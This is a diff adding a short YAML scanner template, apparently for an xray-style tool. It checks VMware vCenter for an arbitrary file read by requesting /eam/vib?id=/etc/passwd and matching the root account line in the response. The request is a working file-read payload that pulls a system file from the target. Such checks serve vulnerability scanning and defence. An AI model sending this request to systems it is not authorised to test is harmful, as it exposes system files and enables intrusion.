@@ -1,0 +1,11 @@
+name: poc-yaml-vmware-vcenter-arbitrary-file-read2
+rules:
+  - method: GET
+    path: /eam/vib?id=/etc/passwd
+    follow_redirects: false
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://t.co/LfvbyBUhF5
